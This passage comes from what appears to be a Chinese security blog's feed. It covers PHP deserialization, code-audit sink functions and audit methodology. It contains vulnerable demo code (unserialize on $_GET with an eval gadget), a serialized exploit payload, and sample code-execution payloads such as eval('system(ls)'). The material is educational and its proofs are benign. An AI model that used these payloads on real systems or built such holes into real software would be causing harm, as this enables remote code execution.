title="反序列化漏洞"></a>反序列化漏洞</h2><p>当传给 unserialize() 的参数可控时，我们可以通过传入一个”精心”构造的序列化字符串，从而<code>控制对象</code>内部的<code>变量</code>甚至是<code>函数</code>，从而达成攻击的目的。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li>__construct() ：构造函数。当对象创建（new）时会自动调用。但在unserialize()时不会自动调用</li><li>__destruct() ：析构函数。在对象被销毁时会自动调用</li><li>__toString() ：当一个对象被当作一个字符串时就会调用。</li><li>__sleep() ：在对象被序列化之前运行</li><li>__wakeup() ：在对象被反序列化之后被调用</li></ul><p>调用的顺序如下面的程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'construct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'destruct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'wakeup run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'sleep run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'toString run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'string '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$s_a = serialize($a);</span><br><span class="line"><span class="comment">#var_dump($s_a);</span></span><br><span class="line">$un_a = unserialize($s_a);</span><br><span class="line"><span class="keyword">echo</span> $un_a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行的结果如下所示：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%BB%93%E6%9E%9C.png" alt></p><p>分析一下上面出现结果的顺序原因：</p><p>首先我调用了new实例化了一个<code>对象 $a</code> ，这时候就会自动调用了construct；</p><p>其次我对实例化出来的<code>对象 $a</code> 进行序列化操作，在序列化操作前会先执行 sleep函数，然后在对对象进行序列化得到<code>字符串$s_a</code>；</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt></p><blockquote><p>注：上图中出现的字符串结果是去掉源码中注释符后重新运行代码由 var_dump($s_a) 所得</p></blockquote><p>然后执行到了unserialize 函数，调用后先对序列化<code>字符串 $s _a</code> 进行反序列化得到<code>对象 $un_a</code> 后再自动调用 wakeup方法；</p><p>然后调用echo函数，<code>$un_a 对象</code>被当作字符串，自动调用了toString方法；</p><p>最后程序执行结束，构造的两个<code>对象 $un_a 和 $a</code> 被释放，自动调用了两次析构函数destruct；</p><p>至此，我们对序列化和反序列化以及魔术方法的调用有了一定的认识</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>用一个在网上随便找来的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"x1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class2  = <span class="keyword">new</span> maniac();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们定位到了反序列化操作 unserialize ，其中参数 test 是我们可控的变量</p><p>很明显，我们的目标是调用 类 x2 中的 eval 方法，但他<code>不是写在魔术方法</code>中，不能直接通过反序列化进行控制。</p><p>继续观察，看到了 maniac 类中的 destruct 魔术方法可以控制 $test 成员变量（一个类）中的 action 方法。</p><p>我们就可以构成利用链： 通过 test 参数传入 maniac 类的序列化字符串，其中的 test 指定为 x2 。这样当程序执行到 unserialize 的时候就会先反序列化操作，随后程序执行完毕，对象销毁而调用危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EXP编写如下：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2=<span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$answer = <span class="keyword">new</span> maniac();</span><br><span class="line">print_r(serialize($answer));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行后得到我们的 PAYLOAD:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"maniac"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;O:<span class="number">2</span>:<span class="string">"x2"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个坑点就是 phpinfo(); 后面如果没有加上 ‘ ; ‘ ，就会执行失败。</p></blockquote><p>在wamp环境下执行的结果如下：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo%E7%BB%93%E6%9E%9C.png" alt></p><p>可以看到上面的利用链构造成功。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP的反序列只是弟弟知识，以后补上java的这部分的知识。把web的填满，再继续底层的研究，继续努力</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP反序列化&quot;&gt;&lt;a href=&quot;#PHP反序列化&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化&quot;&gt;&lt;/a&gt;PHP反序列化&lt;/h1&gt;&lt;p&gt;从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计函数</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/</id>
    <published>2019-12-27T14:59:56.000Z</published>
    <updated>2020-02-19T06:27:08.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计函数"><a href="#代码审计函数" class="headerlink" title="代码审计函数"></a>代码审计函数</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL较多发生于下面这些功能点上：</p><ul><li>登录页面</li><li>获取HTTP头（user-agent/client-ip)</li><li>订单处理（常发生二次注入）</li></ul><blockquote><p> 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 。</p><p>即处理这个输入时进行了转义，但是存储进数据库中又变成了脏数据，然后使用到这个脏数据时就会发生注入。</p></blockquote><p>普通注入关注函数：</p><ul><li>select from</li><li>mysql_connect</li><li>mysql_query</li><li>mysql_fetch_row</li><li>update</li><li>insert</li><li>delete</li></ul><p>编码注入关注函数：</p><ul><li>urldecode/rawurldecode</li><li>mysql_set_charset(‘GBK’)</li></ul><p>防范方法：</p><ul><li>gpc/runtime魔术引号 （PHP配置）</li><li>转义类函数<ul><li>addslashes对单双引号、反斜杠和空字符进行转义</li><li>mysq_ [ real_ ] escape_string同理对指定字符串进行转义</li></ul></li><li>intval等字符转换（适用于int型注入）</li><li>PDO预编译</li></ul><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF关注函数：</p><ul><li>curl</li><li>file_get_content</li><li>fsockopen</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS漏洞关键在于：寻找没有被过滤的参数和输出这些参数的输出函数</p><p>XSS关注函数：</p><ul><li>print</li><li>print_r</li><li>echo</li><li>printf</li><li>sprinf</li><li>sprintf</li><li>die</li><li>var_dump</li><li>var_export</li></ul><p>防范：</p><ul><li>对特殊字符 ‘  “  &lt; &gt; \ : and &amp; # 在输出和二次调用时进行HTML实体转义</li><li>黑白名单方式拦截标签事件属性（自定义正则规则）</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF主要是用于越权，常发生于控制权限的地方：</p><ul><li>管理后台</li><li>会员中心</li><li>论坛帖子</li><li>交易管理</li></ul><p>关注点：</p><ul><li><p>黑盒方法：</p><ul><li>抓包看有没有token</li><li>去掉refer再重发一次看响应是否一样</li></ul></li><li><p>白盒方法：</p><ul><li>查看引用的核心基础文件有没有token关键字或者验证操作</li></ul></li></ul><p>防范方法：</p><ul><li>token</li><li>验证码</li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含关注的地方：模块加载，cache调用的地方</p><p>文件包含关注函数：</p><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><blockquote><p>once ： 只包含一次</p><p>require ： 包含并执行，报错就退出程序</p><p>include ： 包含并执行，报错也继续执行下面的代码</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件上传关注函数：</p><ul><li>move_uploaded_file</li></ul><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>关注函数：</p><ul><li>eval</li><li>assert</li><li>call_user_func_array</li><li>preg_replace</li><li>call_user_func</li><li>动态函数 $a($b)</li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>关注函数：</p><ul><li>system</li><li>exec</li><li>passthru</li><li>shell_exec</li><li>popen</li><li>proc_open</li><li>pcntl_exec</li></ul><p>防范方法：</p><p>用白名单对用户输入进行过滤</p><ul><li>使用自定义函数或函数库来替代外部命令的功能</li><li>使用 escapeshellarg()函数来处理命令参数</li><li>使用 safe_mode_exec_dir 指定可执行文件的路径</li></ul><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>变量覆盖关注函数：</p><ul><li>extract</li><li>parse_str</li><li>import_request_variables</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP代码审计还有很多内容。这里就简单的写一下就是了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计函数&quot;&gt;&lt;a href=&quot;#代码审计函数&quot; class=&quot;headerlink&quot; title=&quot;代码审计函数&quot;&gt;&lt;/a&gt;代码审计函数&lt;/h1&gt;&lt;h2 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计思路</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/</id>
    <published>2019-12-27T14:57:56.000Z</published>
    <updated>2020-02-09T06:33:13.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h1><p>面试的时候问到了关于代码审计的思路，这里就简单总结一下。</p><p>常见的代码审计思路有以下四种：</p><ul><li>根据敏感关键字回溯参数传递过程；  （PS：即找敏感函数逆向回溯参数是否可控）</li><li>查找可控变量，正向追踪变量传递过程； （PS：即直接找可控参数正向追踪到漏洞处）</li><li>寻找敏感功能点，通读功能点代码；   （PS：即分业务功能去审计，重点关注易出现漏洞的功能如upload等）</li><li>直接通读全文代码。   （PS：直接怼项目所有文件，重点放在通防文件、配置文件、入口文件、通用函数文件等）</li></ul><h2 id="一、敏感函数回溯参数过程"><a href="#一、敏感函数回溯参数过程" class="headerlink" title="一、敏感函数回溯参数过程"></a>一、敏感函数回溯参数过程</h2><p>根据敏感函数来逆向追踪参数的传递过程，是目前使用的最多的一种方式，因为大多数漏洞是由于函数的使用不当造成的。另外非函数使用不当的漏洞，如SQL注入，等以后学习再详细介绍。这种方式的优缺点如下：</p><ul><li>优点：只需搜索相应敏感关键字，即可快速挖掘想要的漏洞，可定向挖掘，高效、高质量；</li><li>缺点：由于没有通读代码，对程序整体架构了解不够深入，在挖掘漏洞时定位利用会花点时间，另外对逻辑漏洞挖掘覆盖不到。</li></ul><h2 id="二、通读全文代码"><a href="#二、通读全文代码" class="headerlink" title="二、通读全文代码"></a>二、通读全文代码</h2><p>通读全文代码也有一定的技巧，否则很难读懂Web程序的，也很难理解代码的业务逻辑。首先我们要看程序的大体结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，另外还要注意文件的大小，创建时间，就可以大概知道这个程序实现了那些功能，核心文件有哪些。</p><p>在看目录结构的时候，特别注意以下几个文件：</p><ul><li><strong>函数集文件</strong><br>函数集文件通常命名中包含<strong>functions或者common等关键字</strong>，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件的一个技巧就是打开index.php或者一些功能性文件。</li><li><strong>配置文件</strong><br>配置文件通常命名中包含config关键字，配置文件包括Web程序运行必须的<strong>功能性配置选项以及数据库等配置信息</strong>。从这个文件可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数是用单引号还是双引号，如果是双引号，则很可能会存在代码执行漏洞。</li><li><strong>安全过滤文件</strong><br>安全过滤文件对我们做代码审计至关重要，通常命名中有<strong>filter、safe、check</strong>等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数。</li><li><strong>index文件</strong><br>index是一个程序的<strong>入口文件</strong>，所以我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件。</li></ul><h2 id="三、根据功能点定向审计"><a href="#三、根据功能点定向审计" class="headerlink" title="三、根据功能点定向审计"></a>三、根据功能点定向审计</h2><p>根据经验我们简单介绍几个功能点会出现的漏洞：</p><ul><li><strong>文件上传功能</strong><br>这里说的文件上传在很多功能点都会出现，比如像<strong>文章编辑、资料编辑、头像上传、附件上传</strong>，这个功能最常见的漏洞就是任意文件上传了，后端程序没有严格地限制上传的格式，导致可以上传或者存在绕过的情况，而除了文件上传功能外，还经常发生SQL注入漏洞。</li></ul><ul><li><strong>文件管理功能</strong><br>在文件管理功能中，如果程序将文件名或者文件路径直接在参数中传递，则很有可能会存在任意文件的操作漏洞，比如任意文件读取等，利用的方法是在路径中使用../或者..\跳转目录。<br>除了任意文件操作漏洞外，还可能会存在XSS漏洞，程序会在页面中输出文件名，而通常会疏忽对文件名进行过滤，导致可以在数据库中存入带有尖括号等特殊符号的文件名，最后在页面显示的时候就会被执行。</li></ul><ul><li><strong>登录认证功能</strong><br>登录认证功能不是指一个过程，而是整个操作过程中的认证，目前的认证方式大多是基于Cookie和Session，不少程序会把当前登陆的用户账号等认证信息放到Cookie中，或许是加密方式。进行操作的时候直接从Cookie中读取当前用户信息，这里就存在一个算法可信的问题，如果这段Cookie信息没有加salt一类的东西，就可以导致任意用户登录漏洞，只要知道用户的不扥信息，即可生成认证令牌，甚至有的程序会直接把用户名放到Cookie中，操作的时候直接读取这个用户名的数据，这也是常说的越权漏洞。</li></ul><ul><li><strong>找回密码功能</strong><br>找回密码虽然看起来不像任意文件上传这种可以危害到服务器安全的漏洞，但是如果可以重置管理员的密码，也是可以间接控制业务权限甚至拿到服务权限的。找回密码功能的漏洞有很多利用场景，最常见的是验证码爆破。目前特别是APP应用，请求后端验证码的时候大多是4位，并且没有限制验证码的错误次数和有效时间，于是就出现了爆破的漏洞。</li></ul><p>下面再总结一下容易出现RCE的几个敏感点：</p><h2 id="四、PHP容易导致RCE的敏感函数"><a href="#四、PHP容易导致RCE的敏感函数" class="headerlink" title="四、PHP容易导致RCE的敏感函数"></a>四、PHP容易导致RCE的敏感函数</h2><p><strong>PHP代码执行函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_map()</span><br><span class="line">create_function()</span><br></pre></td></tr></table></figure><p>这些函数会将参数当做php代码或者php函数和参数进行执行,下面进行具体的利用解释：</p><ol><li><p><strong>eval (PHP 4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> (string $code):mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：将参数字符串 $code 作为PHP代码执行</p></blockquote></li></ol><ol start="2"><li><p><strong>assert (PHP 4, PHP 5, PHP 7)</strong> </p><ul><li>PHP 5</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br></pre></td></tr></table></figure><ul><li>PHP 7</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, Throwable $exception ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：判断一个断言是否为FALSE。当传入的参数assertion是字符串时，它将会被assert()当做php代码执行。</p></blockquote></li></ol><ol start="3"><li><p><strong>preg_replace(PHP 4, PHP 5, PHP 7)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br></pre></td></tr></table></figure><blockquote><p>作用： <strong>/e 修正符</strong>使 preg_replace() 将 replacement 参数当作 PHP 代码</p><p>PS： PHP 7.0.0 起，会产生 E_WARNING错误，同时 “\e” 也无法起效</p></blockquote></li></ol><ol start="4"><li><p><strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong>   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用： 第一个参数callback是被调用的<strong>回调函数</strong>，其余参数是回调函数的参数</p></blockquote></li></ol><ol start="5"><li><p><strong>call_user_func_array (PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , <span class="keyword">array</span> $param_arr ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入；</p></blockquote></li></ol><ol start="6"><li><p><strong>array_map (PHP 4 &gt;= 4.0.6, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><blockquote><p> 作用：即将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 </p></blockquote><blockquote><p>PS：回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致</p></blockquote></li></ol><ol start="7"><li><p><strong>create_function (PHP 4 &gt;= 4.0.1, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure><blockquote><p>作用： 从传递的参数创建一个匿名函数，并返回一个唯一的名称</p><p>PS：该函数是会在内部执行eval，所以安全性和eval一致</p></blockquote></li></ol><p>常见的利用payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">"system('ls');"</span>);</span><br><span class="line"></span><br><span class="line">assert(<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)&lt;\/php&gt;/e"</span>, <span class="string">'\1'</span>, <span class="string">"&lt;php&gt;phpinfo()&lt;/php&gt;"</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>,<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">call_user_func_array(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">array_map(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">create_function(<span class="string">'$a'</span>, <span class="string">'assert($a);'</span>));</span><br></pre></td></tr></table></figure><h2 id="五、PHP中变量覆盖"><a href="#五、PHP中变量覆盖" class="headerlink" title="五、PHP中变量覆盖"></a>五、PHP中变量覆盖</h2><p><strong>1、全局变量覆盖</strong></p><p>当<strong>register_global=ON</strong>时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等都可以,那么就可能产生变量覆盖：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"&lt;br/&gt;"</span>;   </span><br><span class="line"><span class="keyword">if</span> ($shabi)&#123;  </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"you are not shabi!"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们直接提交 shabi 参数即可覆盖到原有的变量$shabi /test.php?shabi=1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are not shabi!</span><br></pre></td></tr></table></figure><p><strong>2、$$导致的变量覆盖问题</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>($id == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxxxxxxx&#125;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是一个简单的例子，我们直接提交 id 参数，就能覆盖到原变量 $id。原因在于循环中在遍历到id参数时，会因为$$产生赋值操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这样就导致了变量的覆盖</p><p><strong>3、extract()变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = <span 